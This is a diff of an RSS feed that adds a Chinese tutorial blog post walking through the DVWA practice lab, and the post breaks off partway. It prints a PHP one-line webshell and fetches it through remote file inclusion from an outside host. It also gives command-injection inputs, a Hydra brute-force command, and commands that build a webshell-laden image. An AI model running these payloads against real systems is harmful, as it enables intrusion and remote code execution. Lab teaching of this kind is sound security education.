@@ -1,4 +1,674 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>SkyWT</title><description>热爱与激情永不止息。</description><link>https://skywt.cn/</link><language>zh-cn</language><item><title>✨ 二十一岁，繁花盛开。</title><link>https://skywt.cn/blog/twenty-one-years-old/</link><guid isPermaLink="true">https://skywt.cn/blog/twenty-one-years-old/</guid><description>二十一岁了，到了小时候觉得很遥远的年纪。
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>SkyWT</title><description>热爱与激情永不止息。</description><link>https://skywt.cn/</link><language>zh-cn</language><item><title>DVWA 通关教程</title><link>https://skywt.cn/blog/dvwa-tutorial/</link><guid isPermaLink="true">https://skywt.cn/blog/dvwa-tutorial/</guid><description>**DVWA**（Damn Vulnerable Web Application，该死的易受攻击的 Web 应用）是一个用于 Web 渗透测试的靶场。这一项目基于 PHP，提供了多个常见的 Web 漏洞的经典实现，非常适合 Web 安全入门实践。（[GitHub 仓库](https://github.com/digininja/DVWA)）
+
+DVWA 的每个漏洞（vulnerability）分为四个安全等级（也代表攻击难度）：
+
+* **Low**：完全没有安全措施。
+* **Medium**：不良的安全实践。
+* **High**：（或许更难攻击的）不良安全实践。
+* **Impossible**：安全的实践。
+
+</description><pubDate>Wed, 08 May 2024 07:30:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;strong&gt;DVWA&lt;/strong&gt;（Damn Vulnerable Web Application，该死的易受攻击的 Web 应用）是一个用于 Web 渗透测试的靶场。这一项目基于 PHP，提供了多个常见的 Web 漏洞的经典实现，非常适合 Web 安全入门实践。（&lt;a href=&quot;https://github.com/digininja/DVWA&quot;&gt;GitHub 仓库&lt;/a&gt;）&lt;/p&gt;
+&lt;p&gt;DVWA 的每个漏洞（vulnerability）分为四个安全等级（也代表攻击难度）：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Low&lt;/strong&gt;：完全没有安全措施。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Medium&lt;/strong&gt;：不良的安全实践。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;High&lt;/strong&gt;：（或许更难攻击的）不良安全实践。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Impossible&lt;/strong&gt;：安全的实践。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;环境配置&lt;/h2&gt;
+&lt;p&gt;我的运行环境是 macOS。接下来，我们使用 Docker 部署实验环境。&lt;/p&gt;
+&lt;h3&gt;使用 Docker Compose 搭建环境&lt;/h3&gt;
+&lt;p&gt;这个项目的 GitHub 上&lt;a href=&quot;https://github.com/digininja/DVWA/pkgs/container/dvwa&quot;&gt;预构建的镜像&lt;/a&gt;，都是 linux/amd64 平台，不方便在我 macOS 的 linux/arm64/v8 平台下运行（或许要通过 Rosetta）。因此，我们选择克隆代码仓库，在本地构建镜像。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;git clone git@github.com:digininja/DVWA.git
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;仓库中其实已经包含了 &lt;code&gt;compose.yml&lt;/code&gt; 文件，不过为了满足自己的需求，我还是重新写了一个 compose 文件。&lt;/p&gt;
+&lt;p&gt;除了 MySQL（MariaDB）数据库以外，为了方便起见，再部署一个 phpMyAdmin 来查看和管理数据库内容（毕竟干啥都要写 SQL 太不直观了）。最终 &lt;code&gt;compose.yml&lt;/code&gt; 文件如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;version: “3”
+
+services:
+  dvwa:
+    build: .
+    environment:
+      - DB_SERVER=mariadb
+    depends_on:
+      - mariadb
+    volumes:
+      - config:/var/www/html/config
+    networks:
+      - dvwa
+    ports:
+      - &amp;quot;127.0.0.1:80:80&amp;quot;
+    restart: unless-stopped
+  mariadb:
+    image: mariadb:11.3.2
+    environment:
+      - MARIADB_ROOT_PASSWORD=v556jYVdMsVp5rox
+      - MARIADB_DATABASE=dvwa
+      - MARIADB_USER=dvwa
+      - MARIADB_PASSWORD=p@ssw0rd
+    volumes:
+      - database:/var/lib/mysql
+    networks:
+      - dvwa
+    restart: unless-stopped
+  phpmyadmin:
+    image: phpmyadmin:5.2.1
+    environment:
+      - PMA_HOST=mariadb
+    depends_on:
+      - mariadb
+    networks:
+      - dvwa
+    ports:
+      - &amp;quot;127.0.0.1:8080:80&amp;quot;
+    restart: unless-stopped
+
+networks:
+  dvwa:
+
+volumes:
+  config:
+  database:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;💡 提示：自己构建镜像是更好的选择。&lt;/strong&gt;网上很多使用 Docker 部署 DVWA 的文章，使用 DockerHub 上 &lt;code&gt;vulnerables/web-dvwa&lt;/code&gt; 这个镜像。这个镜像最近的更新日期已经是五年前了，不推荐使用。相比之下，自己从官方的 repo 里构建是更好的选择。&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;docker compose up -d&lt;/code&gt; 就能构建容器并启动。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[+] Running 3/6
+ ⠦ Network dvwa_dvwa            Created                              0.6s 
+ ⠦ Volume &amp;quot;dvwa_config&amp;quot;         Created                              0.5s 
+ ⠦ Volume &amp;quot;dvwa_database&amp;quot;       Created                              0.5s 
+ ✔ Container dvwa-mariadb-1     Started                              0.3s 
+ ✔ Container dvwa-phpmyadmin-1  Started                              0.5s 
+ ✔ Container dvwa-dvwa-1        Started                              0.5s 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;⚠️ 注意：在开启之前，检查系统端口占用情况。&lt;/strong&gt;macOS 默认会安装 httpd，这个服务可能会被某些软件（疑似 Tailscale）开启，占用 80 端口。即使容器跑起来之后，访问 &lt;code&gt;localhost&lt;/code&gt; 只能看到莫名其妙的一行「It works! 」提示。这种情况下，要么关闭 httpd，要么更改容器映射的端口。&lt;/p&gt;
+&lt;p&gt;现在，访问 &lt;code&gt;localhost&lt;/code&gt;，能看到 DVWA 的登录页面，这代表服务成功跑起来了：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/1185019003.png&quot; alt=&quot;DVWA 登录页面&quot;&gt;&lt;/p&gt;
+&lt;p&gt;此时还没创建数据库，可以访问 &lt;code&gt;localhost/setup.php&lt;/code&gt; 进行初始化检查，并创建数据库：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/2381126624.png&quot; alt=&quot;DVWA Setup 页面&quot;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到所有 PHP 相关的配置都默认 OK 了，无需我们手动调整。这就是使用 Docker 部署的好处。&lt;/p&gt;
+&lt;p&gt;创建数据库后，回到登录页面，使用默认用户名 &lt;code&gt;admin&lt;/code&gt; 和默认密码 &lt;code&gt;password&lt;/code&gt; 即可登录。&lt;/p&gt;
+&lt;p&gt;此外，访问 &lt;code&gt;localhost:8080&lt;/code&gt;，可以看到 phpMyAdmin 的登录页面。使用 root 用户登录，即可方便地查看、编辑数据库。&lt;/p&gt;
+&lt;h3&gt;配置 reCAPTCHA&lt;/h3&gt;
+&lt;p&gt;DVWA 包含 Insecure CAPTCHA 这个实验，要用到 Google 的 reCAPTCHA。这是一种机器人检测工具，就是「给一堆图片让我们选出其中的摩托车」这类的验证器。&lt;/p&gt;
+&lt;p&gt;为了使用 Google reCAPTCHA，我们需要在&lt;a href=&quot;https://www.google.com/recaptcha/admin/create&quot;&gt;这个页面&lt;/a&gt;注册一个新的站点，申请 public key 和 private key：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/1012265525.png&quot; alt=&quot;DVWA 申请页面&quot;&gt;&lt;/p&gt;
+&lt;p&gt;「reCAPTCHA type」其实是要选择版本，v2 版本是要对用户请求发起质询的，v3 版本则是在使用时根据用户行为打分。建议选择 v2 的「&amp;quot;I&apos;m not a robot&amp;quot; Checkbox」版本，这个版本最直观。别忘了在下面的「Domains」里加入 &lt;code&gt;localhost&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;提交之后会得到 public key 和 private key，需要将这两个 key 填入 DVWA 的配置文件。刚才在 compose 文件中我们已经将配置文件目录挂载到名为 &lt;code&gt;config&lt;/code&gt; 的 volume 中，只要找到其中的 &lt;code&gt;config.inc.php&lt;/code&gt; 并填写即可。&lt;/p&gt;
+&lt;p&gt;由于众所周知的原因，reCAPTCHA 的默认服务器在国内无法访问，而我们的容器中的 PHP 进程需要访问其服务器才能验证 reCAPTCHA。解决方案是将 www.google.com 替换成不用代理即可访问的镜像站 www.recaptcha.net。需要修改的是 &lt;code&gt;/var/www/html/external/recaptcha/recaptchalib.php&lt;/code&gt; 中的 url 变量。&lt;/p&gt;
+&lt;p&gt;配置完成后，打开 Insecure CAPTCHA 这一关进行测试，在 impossible 难度下能够正常修改密码，就代表配置成功。&lt;/p&gt;
+&lt;h2&gt;Brute Force&lt;/h2&gt;
+&lt;p&gt;这一关提供了一个简单的登录场景。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;通过脚本结合字典爆破出密码。&lt;/p&gt;
+&lt;p&gt;事实上，这个登录表单和 DVWA 程序登录表单用的是同一个数据表，所以登录组合之一是 &lt;code&gt;admin&lt;/code&gt; 和 &lt;code&gt;password&lt;/code&gt;。在表中，还有若干其他用户。&lt;/p&gt;
+&lt;h3&gt;Low：简单暴力&lt;/h3&gt;
+&lt;p&gt;这一级别没有任何防御。并且有个非常逆天的设计：&lt;strong&gt;使用 GET 请求明文提交表单&lt;/strong&gt;。测试使用 testuser 和 testpass 登录，发现 URL 直接变成：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/brute/?username=testuser&amp;amp;password=testpass&amp;amp;Login=Login#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以自己写 shell 脚本爆破，也可以用 Hydra 工具爆破。注意：发请求的时候，要带上 cookie，否则 DVWA 程序会要求你登录。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hydra -f -L ./Usernames/top-usernames-shortlist.txt -P ./Passwords/2020-200_most_used_passwords.txt -v localhost http-get-form &amp;quot;/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:F=incorrect:H=Cookie\: security=low; PHPSESSID=0lc3tfkicmfiebe1og7vqej77q&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;也可以用 BurpSuite Intruder。在「Options」、「Grep - Match」里添加「incorrect」关键词，方便识别得到的结果是否成功。&lt;/p&gt;
+&lt;p&gt;或者也可以用所谓的「万能密码」，也就是 SQL 注入，用户名写 &lt;code&gt;admin&apos;;#&lt;/code&gt;  甚至 &lt;code&gt;&apos; OR 1 = 1 LIMIT 1;#&lt;/code&gt; 就行。当然这个考点就不是 Brute Force 了。&lt;/p&gt;
+&lt;h3&gt;Medium：等待时间&lt;/h3&gt;
+&lt;p&gt;和 low 的区别在于：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对用户名、密码字符串做了转义（不能 SQL 注入了）。&lt;/li&gt;
+&lt;li&gt;如果错误，需要等待 2 秒才会返回结果。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;同样用 Hydra 或者 BurpSuite Intruder，用和上面一样的方法，可以完成爆破，只是比 low 要慢一些。&lt;/p&gt;
+&lt;p&gt;事实上，可以假设在网络延迟正常的情况下，如果密码正确，返回结果时间一般不会慢于 0.5 秒（这个阈值可以根据网络延迟调整）。所以，当一次尝试等待时间超过了 0.5 秒，可以直接认为密码错误而停止等待。这样可以节省不少时间。&lt;/p&gt;
+&lt;h3&gt;High：随机等待时间 &amp;amp; CSRF 防护&lt;/h3&gt;
+&lt;p&gt;和 medium 的区别在于：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果密码错误，等待随机 0～3 秒才返回。&lt;/li&gt;
+&lt;li&gt;表单中增加了隐藏的 input 组件 &lt;code&gt;user_token&lt;/code&gt;，值为每次随机的字符串，用于防止 CSRF 攻击。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;添加了 token 只是略微增加了我们爆破的复杂性：每一个登录请求都必须对应一个对表单的请求。可以使用 BurpSuite 的「Grep - Extract」功能提取 token，用 Pitchfork 模式逐一尝试。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/3106872127.png&quot; alt=&quot;截屏2022-08-03 17.44.14.png&quot;&gt;&lt;/p&gt;
+&lt;h3&gt;Impossible：账户锁定&lt;/h3&gt;
+&lt;p&gt;在 high 的基础上：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用 POST 提交表单。&lt;/li&gt;
+&lt;li&gt;在后端（数据库中）记录了&lt;strong&gt;用户尝试错误的次数、上次登录时间&lt;/strong&gt;，如果连续三次密码错误，账户锁定 15 分钟。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;有了尝试三次账户锁定，暴力就基本上无法快速爆破特定账户了。&lt;/p&gt;
+&lt;h2&gt;Command Injection&lt;/h2&gt;
+&lt;p&gt;这一关可以视为 Remote Code Execution（RCE）攻击的一个应用。提供的场景是：提供一个表单，接收用户输入的 IP 地址，在服务器上使用 PHP 的 &lt;code&gt;exec()&lt;/code&gt; 执行 ping 命令，并返回输出的结果。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;在服务器上执行任意我们想要的命令。&lt;/p&gt;
+&lt;h3&gt;Low：不过滤&lt;/h3&gt;
+&lt;p&gt;在后端直接将 &lt;code&gt;ping&lt;/code&gt; 命令拼接上我们输入的字符串，然后执行。那么，用 &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; 或者 &lt;code&gt;;&lt;/code&gt; 就可以结束之前的命令，添加任意命令。比如：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;127.0.0.1; ls -al
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Medium：简单过滤&lt;/h3&gt;
+&lt;p&gt;在 low 的基础上，做了 &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; 和 &lt;code&gt;;&lt;/code&gt; 的检测，在字符串中将它们删除。&lt;/p&gt;
+&lt;p&gt;能够做命令注入的不止上面两种字符，还可以用管道符 &lt;code&gt;|&lt;/code&gt;。这个符号本来的用法是将上一个命令的输出作为下一个命令的输入。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;127.0.0.1 | ls -al
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;High：更多过滤&lt;/h3&gt;
+&lt;p&gt;替换了不少字符：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;    // Set blacklist
+    $substitutions = array(
+        &apos;&amp;amp;&apos;  =&amp;gt; &apos;&apos;,
+        &apos;;&apos;  =&amp;gt; &apos;&apos;,
+        &apos;| &apos; =&amp;gt; &apos;&apos;,
+        &apos;-&apos;  =&amp;gt; &apos;&apos;,
+        &apos;$&apos;  =&amp;gt; &apos;&apos;,
+        &apos;(&apos;  =&amp;gt; &apos;&apos;,
+        &apos;)&apos;  =&amp;gt; &apos;&apos;,
+        &apos;`&apos;  =&amp;gt; &apos;&apos;,
+        &apos;||&apos; =&amp;gt; &apos;&apos;,
+    ); 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;仔细观察，过滤的不是管道符这个字符，而是管道符加一个空格……所以用 &lt;code&gt;127.0.0.1 |ls&lt;/code&gt; 这种还是可以的。&lt;/p&gt;
+&lt;p&gt;并且没有过滤换行（&lt;code&gt;%0a&lt;/code&gt;）、回车（&lt;code&gt;%0d&lt;/code&gt;），这二者同样可以达到分隔多条命令的效果。当然，前端的输入框里无法输入换行，需要用别的工具发请求，将 ip 写为 &lt;code&gt;127.0.0.1%0als&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;High 过滤了减号 &lt;code&gt;-&lt;/code&gt;，所以无法处理带参数的命令。&lt;/p&gt;
+&lt;h3&gt;Impossible：白名单&lt;/h3&gt;
+&lt;p&gt;「白名单」永远比「黑名单」安全。这个等级直接判断输入的 IP 是否符合 IPv4 格式，并且也引入了 CSRF 攻击防护。&lt;/p&gt;
+&lt;h2&gt;Cross Site Request Forgery (CSRF)&lt;/h2&gt;
+&lt;p&gt;这一关提供了一个修改密码的表单，要求输入新的密码并确认，提交后就能修改密码。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;在受害者不知情的情况下，使受害者更改密码。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;⚠️ 注意：&lt;/strong&gt;现代浏览器基本都已经禁止第三方 Cookie，这意味着无论如何配置，当发送跨域请求时都不能携带 Cookie，&lt;strong&gt;这一漏洞已经无法利用&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;以下介绍的仅为在允许第三方 Cookie 的情况下，理论利用方式。&lt;/p&gt;
+&lt;h3&gt;Low：无防护&lt;/h3&gt;
+&lt;p&gt;没有防范 CSRF 攻击的检测，并且通过 GET 请求发数据。只要攻击者诱导受害者打开一个 URL，或者向这个 URL 发送请求，就可以修改密码。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/csrf/?password_new=123456&amp;amp;password_conf=123456&amp;amp;Change=Change#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Medium：判断 referer&lt;/h3&gt;
+&lt;p&gt;这一等级在收到请求后，判断 HTTP referer 请求头的内容是否包含当前服务器域名。&lt;/p&gt;
+&lt;p&gt;然而，使用的是 &lt;code&gt;stripos&lt;/code&gt; 函数，即单纯的子串检测。假设 DVWA 运行在 &lt;code&gt;dvwa.com&lt;/code&gt;，那么只要 referer 包含这个子串即可。例如从 &lt;code&gt;skywt.cn&lt;/code&gt; 发起攻击，一种简单的方式是：&lt;code&gt;https://skywt.cn/?a=dvwa.com&lt;/code&gt;。&lt;/p&gt;
+&lt;h3&gt;High：CSRF token&lt;/h3&gt;
+&lt;p&gt;这一等级加入了 CSRF token，当用户加载表单时，表单内包含一个 hidden input，其中包含每次不同的 token；当提交时需要带上这个 token。&lt;/p&gt;
+&lt;p&gt;这大大增加了攻击难度：恶意脚本需要使用用户的凭证先发送请求，获取页面上的 token，再将 token 一并发送，请求修改密码。&lt;/p&gt;
+&lt;h3&gt;Impossible：提供原密码&lt;/h3&gt;
+&lt;p&gt;这一等级要求在修改密码请求中提供用户的原密码。攻击者无法得知用户的原密码，所以无法使用 CSRF 攻击。&lt;/p&gt;
+&lt;h2&gt;File Inclusion&lt;/h2&gt;
+&lt;p&gt;这一关提供的页面，在 URL 中指定参数 &lt;code&gt;page&lt;/code&gt; 即可包含指定的页面。情境的本意是只能包含 file1、file2、file3 三个页面之一。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;包含木马页面，执行我们想要的代码。&lt;/p&gt;
+&lt;h3&gt;Low：无防护&lt;/h3&gt;
+&lt;p&gt;直接可以进行任意文件包含，因为 URL 里可以任意引用文件，为所欲为。&lt;/p&gt;
+&lt;p&gt;例如，在服务器 skywt.cn 上放一个一句话木马 &lt;code&gt;yjh.txt&lt;/code&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php eval($_GET[&apos;a&apos;]);?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这行 PHP 代码拿到 GET 请求传入的 a 参数，然后作为代码执行。通过这一代码，我们可以执行任何代码。这就是「一句话木马」。&lt;/p&gt;
+&lt;p&gt;接下来，访问：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot;&gt;http://localhost/vulnerabilities/fi/?page=https://skywt.cn/yjh.txt&amp;amp;a=phpinfo();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;页面包含了我们的 &lt;code&gt;yjh.txt&lt;/code&gt;，传入的 &lt;code&gt;phpinfo()&lt;/code&gt;; 就会被执行，显示 PHP 信息。照此原理，能够执行任何 PHP 代码。&lt;/p&gt;
+&lt;p&gt;利用 PHP 的 &lt;code&gt;exec()&lt;/code&gt; 函数，事实上相当于已经拿到了系统的 shell。&lt;/p&gt;
+&lt;h3&gt;Medium：关键词过滤&lt;/h3&gt;
+&lt;p&gt;对传入的 page 参数过滤了 &lt;code&gt;http://&lt;/code&gt;、&lt;code&gt;https://&lt;/code&gt;、&lt;code&gt;../&lt;/code&gt;、&lt;code&gt;..\&lt;/code&gt; 这几个关键词。&lt;/p&gt;
+&lt;p&gt;PHP 的 &lt;code&gt;str_replace&lt;/code&gt; 函数只会进行「一次替换」，也就是将一个字符串中所有子串 A 进行替换，至于替换之后得到的新字符串是否包含子串 A，它并不关心。利用这个缺陷，我们可以使用「双写」的办法：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot;&gt;http://localhost/vulnerabilities/fi/?page=httpshttps://://skywt.cn/yjh.txt&amp;amp;a=phpinfo();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;（也可以结合下一关的文件上传，使其引用本地的木马文件，即 URL 不包含 &lt;code&gt;http(s)://&lt;/code&gt; 协议。&lt;/p&gt;
+&lt;h3&gt;High：只能是文件&lt;/h3&gt;
+&lt;p&gt;限制了传入的 page 参数必须以 file 开头。本意是限制只能引用诸如 &lt;code&gt;file1.php&lt;/code&gt; 这样的文件，然而事实上可以用 &lt;code&gt;file://&lt;/code&gt; 协议引用本地的任何文件。&lt;/p&gt;
+&lt;p&gt;需要结合下一关的文件上传漏洞，先上传一句话木马到本地，再引用。下文详述。&lt;/p&gt;
+&lt;h3&gt;Impossible：白名单&lt;/h3&gt;
+&lt;p&gt;使用「白名单」，限制只能访问 file1、file2、file3 这三个 PHP 文件。&lt;/p&gt;
+&lt;h2&gt;File Upload&lt;/h2&gt;
+&lt;p&gt;这一关提供了一个表单，能在其中选择一个文件并上传。情境的本意是只能上传图片文件，但是由于不佳的实现，导致能够上传 PHP 脚本木马。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;上传 PHP 木马并执行我们想要的代码。&lt;/p&gt;
+&lt;h3&gt;Low：无防护&lt;/h3&gt;
+&lt;p&gt;没有任何检测，直接将上传的文件保存并移动到某个特定的目录。&lt;/p&gt;
+&lt;p&gt;上传之前提到的一句话木马 &lt;code&gt;yjh.php&lt;/code&gt; 就行。在这个 URL 里，能够利用木马：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/hackable/uploads/yjh.php?a=phpinfo();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Medium：限制 MIME&lt;/h3&gt;
+&lt;p&gt;只限制请求的 MIME 为 &lt;code&gt;image/jpeg&lt;/code&gt; 或者 &lt;code&gt;image/png&lt;/code&gt;，并不实际检测上传的内容。&lt;/p&gt;
+&lt;p&gt;可以仍然上传这个 PHP 文件，只要在上传的请求中修改一下 Content-Type 就行了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/4042635291.png&quot; alt=&quot;截屏2022-08-05 12.11.55.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;也可以在真实的图片文件后加 PHP 一句话木马再上传。下文 high 中详述。&lt;/p&gt;
+&lt;h3&gt;High：限制文件拓展名&lt;/h3&gt;
+&lt;p&gt;相比 medium，这个等级：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用 &lt;code&gt;getimagesize&lt;/code&gt; 函数获取图像内容实际大小，如果是 0 则拒绝上传。&lt;/li&gt;
+&lt;li&gt;检测文件拓展名是否是 &lt;code&gt;jpg&lt;/code&gt;、&lt;code&gt;jpeg&lt;/code&gt;、&lt;code&gt;png&lt;/code&gt; 三者之一。如果不是则拒绝上传。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;第一个限制意味着，直接上传只包含一行 PHP 代码的一句话木马无法成功，必须上传一张真实的图片。我们可以用文本编辑器在一张真实的图片最后加上一句话木马。PHP 的特性是只会将 &lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt; 或 &lt;code&gt;&amp;lt;? ?&amp;gt;&lt;/code&gt; 中的内容视为脚本并运行，在这个之外的内容都会不解析而是直接显示。注意：使用这种方法，需要确保这个图片文件中，在我们插入的代码之前，没有出现过 &lt;code&gt;&amp;lt;?&lt;/code&gt; 这样的符号，否则在执行到我们的代码之前 PHP 就会抛出语法错误。&lt;/p&gt;
+&lt;p&gt;如果使用日常的图片，生成 &lt;code&gt;&amp;lt;?&lt;/code&gt; 组合其实概率不低。我们可以生成一张最小的图片，确保不包含 &lt;code&gt;&amp;lt;?&lt;/code&gt; 组合：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;convert -size 1x1 xc:black yjh.jpg
+echo &amp;quot;&amp;lt;?php eval(\$_GET[&apos;a&apos;]);?&amp;gt;&amp;quot; &amp;gt;&amp;gt; yjh.jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上传这个图片文件，能够规避第一条规则的检测。&lt;/p&gt;
+&lt;p&gt;第二个限制，并不好解决。一般来说，像 Nginx 之类的 WebServer，PHP 环境的配置方式都是：对于服务器上以 &lt;code&gt;.php&lt;/code&gt; 结尾的文件，交由 PHP 的引擎执行脚本；对于其他拓展名的文件，则直接视为静态资源呈现。这样，如果文件结尾不是 &lt;code&gt;.php&lt;/code&gt;，我们无法将其单独作为 PHP 来执行。&lt;/p&gt;
+&lt;p&gt;所以，这一关要结合上一关的文件包含漏洞。成功上传包含一句话木马的 &lt;code&gt;yjh.jpg&lt;/code&gt; 之后，只要利用 &lt;code&gt;file://&lt;/code&gt; 协议，访问这个 URL：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/yjh.jpg&amp;amp;a=phpinfo();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Impossible：图片重新编码&lt;/h3&gt;
+&lt;p&gt;相比之前的等级，该等级加入了更加复杂的检测：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;检测 MIME 类型、拓展名。&lt;/li&gt;
+&lt;li&gt;对图片去除元信息、重新编码再上传。这样图片中不可能包含任何其他东西。&lt;/li&gt;
+&lt;li&gt;CSRF 防护。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Insecure CAPTCHA&lt;/h2&gt;
+&lt;p&gt;这一关提供修改密码的场景，表单里提供了一个密码输入框、密码确认框，以及一个 reCAPTCHA 验证组件。期望的场景是：通过验证，才能提交修改密码。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;不经过 reCAPTCHA 的验证也能实现修改密码。&lt;/p&gt;
+&lt;h3&gt;Low：没用的 step 验证&lt;/h3&gt;
+&lt;p&gt;这个 low 的实现真的很逆天，表单里有一个 hidden input 名为 &lt;code&gt;step&lt;/code&gt;，初始 value 为 1。当为 1 时提交，验证 reCAPTCHA，如果通过则&lt;strong&gt;重新打开页面&lt;/strong&gt;并将 &lt;code&gt;step&lt;/code&gt; 改为 2。当为 2 时提交，则不验证 reCAPTCHA 直接修改密码。&lt;/p&gt;
+&lt;p&gt;那么，直接在页面里将 &lt;code&gt;step&lt;/code&gt; 改为 2 再提交就好了。&lt;/p&gt;
+&lt;h3&gt;Medium：又一个没用的验证&lt;/h3&gt;
+&lt;p&gt;依然很逆天，在 low 的基础上，当 &lt;code&gt;step&lt;/code&gt; 为 1 且验证通过时，重新打开页面，&lt;code&gt;step&lt;/code&gt; 设为 2，并添加一个名为 &lt;code&gt;passed_captcha&lt;/code&gt; 的 hidden input 并设为 true。&lt;/p&gt;
+&lt;p&gt;和 low 类似，只要在页面里将 &lt;code&gt;step&lt;/code&gt; 改为 2，添加 &lt;code&gt;passed_captcha&lt;/code&gt;元素即可：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;passed_captcha&amp;quot; value=&amp;quot;true&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;High：开发者留的后门&lt;/h3&gt;
+&lt;p&gt;相比前两个等级，high 终于没有使用愚蠢的 &lt;code&gt;step&lt;/code&gt;。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;添加了 CSRF 防护。&lt;/li&gt;
+&lt;li&gt;提交后直接验证 reCAPTCHA，如果通过则修改密码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;然而，在表单的注释里能看到这段内容：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!-- **DEV NOTE**   Response: &apos;hidd3n_valu3&apos;   &amp;amp;&amp;amp;   User-Agent: &apos;reCAPTCHA&apos;   **/DEV NOTE** --&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;事实上，当这个页面接收到 POST 请求，其中 &lt;code&gt;g-recaptcha-response&lt;/code&gt; 字段为 &lt;code&gt;hidd3n_valu3&lt;/code&gt; 并且 UA 为 &lt;code&gt;reCAPTCHA&lt;/code&gt; 时，会直接视为通过了验证。&lt;/p&gt;
